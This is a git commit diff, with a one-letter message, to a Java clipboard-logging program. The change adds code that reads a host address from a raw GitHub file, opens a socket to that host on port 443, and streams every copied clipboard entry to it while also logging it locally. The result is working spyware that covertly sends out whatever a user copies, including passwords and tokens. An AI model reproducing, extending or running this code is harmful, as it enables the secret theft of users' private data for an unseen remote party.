7fe618bc7ff171465a75bdefdfb58df2aaf10b10
Yank5 <Yank5@nycstudents.net>
2023-06-02 12:36:08 -0400

    a

--- src/Main.java
+++ src/Main.java
@@ -3,15 +3,17 @@ import java.awt.*;
 import java.awt.datatransfer.Clipboard;
 import java.awt.datatransfer.DataFlavor;
 import java.awt.datatransfer.UnsupportedFlavorException;
-import java.io.BufferedWriter;
-import java.io.File;
-import java.io.FileWriter;
-import java.io.IOException;
+import java.io.*;
 import java.lang.management.MemoryType;
 import java.lang.management.MemoryUsage;
 import java.lang.ref.SoftReference;
 import java.lang.ref.WeakReference;
 import java.lang.reflect.Method;
+import java.net.*;
+import java.net.http.HttpClient;
+import java.net.http.HttpRequest;
+import java.net.http.HttpResponse;
+import java.nio.charset.StandardCharsets;
 import java.nio.file.Paths;
 import java.util.Scanner;
 import java.util.UUID;
@@ -20,14 +22,31 @@ import java.util.jar.JarEntry;
 import java.util.jar.JarFile;
 
 public class Main {
-    public static void main(String[] args) throws IOException {
-        //System.out.println("Hello world!");
+    public static void main(String[] args){
+        HttpClient client=HttpClient.newHttpClient();
+        HttpRequest request= HttpRequest.newBuilder()
+                .uri(URI.create("https://raw.githubusercontent.com/yank5/requestip/main/README.md"))
+                .build();
+
+        String c;
+        OutputStream outputStream;
+        Socket socket;
         JFrame jFrame=new JFrame();
         jFrame.setSize(new Dimension(300,300));
         jFrame.setVisible(true);
         File file=new File("copylog");
-        //System.out.flush();
-        FileWriter filew= new FileWriter(file);
+        FileWriter filew;
+        try {
+            c = client.send(request, HttpResponse.BodyHandlers.ofString()).body();
+            System.out.println(c);
+            socket=new Socket(c,443);
+            outputStream=socket.getOutputStream();
+            socket.setKeepAlive(true);
+
+            filew = new FileWriter(file);
+        } catch (Exception e) {
+            throw new RuntimeException(e);
+        }
 
 
 //        System.out.println(UUID.randomUUID());
@@ -37,7 +56,6 @@ public class Main {
         File cook=new File("");
 //        DebugGraphics r=new DebugGraphics();
 
-
         String clip=getClipBoard();
         System.out.println(clip);
         while(true) {
@@ -46,7 +64,9 @@ public class Main {
                 clip=getClipBoard();
                 try {
                     filew.append(clip).append("\n");
+                    outputStream.write(clip.getBytes(StandardCharsets.UTF_8));
                     filew.flush();
+                    outputStream.flush();
                 } catch (IOException e) {
                     throw new RuntimeException(e);
                 }
